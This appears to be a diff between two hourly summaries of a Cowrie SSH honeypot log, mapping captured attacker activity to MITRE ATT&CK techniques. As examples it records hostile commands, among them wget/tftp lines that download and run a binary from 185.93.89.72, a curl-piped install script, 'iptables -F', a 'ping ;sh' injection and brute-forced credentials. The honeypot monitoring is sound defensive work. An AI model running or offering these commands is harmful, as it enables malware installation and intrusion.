@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-22 13:00:45",
+  "generated": "2026-09-22 14:01:43",
   "totals": {
-    "commands": 3310,
-    "login_failed": 3974,
-    "login_success": 995,
-    "sessions": 4307
+    "commands": 3345,
+    "login_failed": 4038,
+    "login_success": 1001,
+    "sessions": 4415
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3974,
+      "count": 4038,
       "examples": [
         "daoperator / daoperator",
         "root / User@2022",
@@ -21,14 +21,14 @@
         "root / root"
       ],
       "first": "2026-09-22T00:01:24.262742Z",
-      "last": "2026-09-22T13:00:21.485059Z",
-      "unique_ips": 66
+      "last": "2026-09-22T14:00:57.954427Z",
+      "unique_ips": 74
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 995,
+      "count": 1001,
       "examples": [
         "salam / salam",
         "experiment / experiment",
@@ -37,8 +37,8 @@
         "root / password"
       ],
       "first": "2026-09-22T00:06:10.185022Z",
-      "last": "2026-09-22T12:58:54.774058Z",
-      "unique_ips": 54
+      "last": "2026-09-22T13:45:39.862900Z",
+      "unique_ips": 57
     },
     {
       "id": "T1083",
@@ -57,7 +57,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 155,
+      "count": 156,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -66,8 +66,8 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-22T00:06:56.657809Z",
-      "last": "2026-09-22T12:34:09.928294Z",
-      "unique_ips": 24
+      "last": "2026-09-22T13:18:44.972673Z",
+      "unique_ips": 25
     },
     {
       "id": "T1222.002",
@@ -89,7 +89,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 47,
+      "count": 58,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -98,8 +98,8 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-09-22T00:06:49.812853Z",
-      "last": "2026-09-22T12:58:58.490892Z",
-      "unique_ips": 24
+      "last": "2026-09-22T13:25:07.362453Z",
+      "unique_ips": 25
     },
     {
       "id": "T1033",
@@ -177,24 +177,36 @@
       "first": "2026-09-22T02:49:13.484849Z",
       "last": "2026-09-22T09:33:15.466451Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-09-22T13:25:04.413459Z",
+      "last": "2026-09-22T13:25:04.413459Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      945
+      949
     ],
     [
       "sh",
-      944
+      948
     ],
     [
       "shell",
-      53
+      57
     ],
     [
       "/bin/busybox UNSTABLE",
-      47
+      50
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -202,26 +214,26 @@
     ],
     [
       "/bin/busybox",
-      8
+      11
+    ],
+    [
+      "enable",
+      5
+    ],
+    [
+      "linuxshell",
+      5
+    ],
+    [
+      "ping ;sh",
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
       5
     ],
     [
-      "enable",
-      4
-    ],
-    [
-      "linuxshell",
-      4
-    ],
-    [
       "enablelinuxshell",
-      4
-    ],
-    [
-      "ping ;sh",
       4
     ],
     [
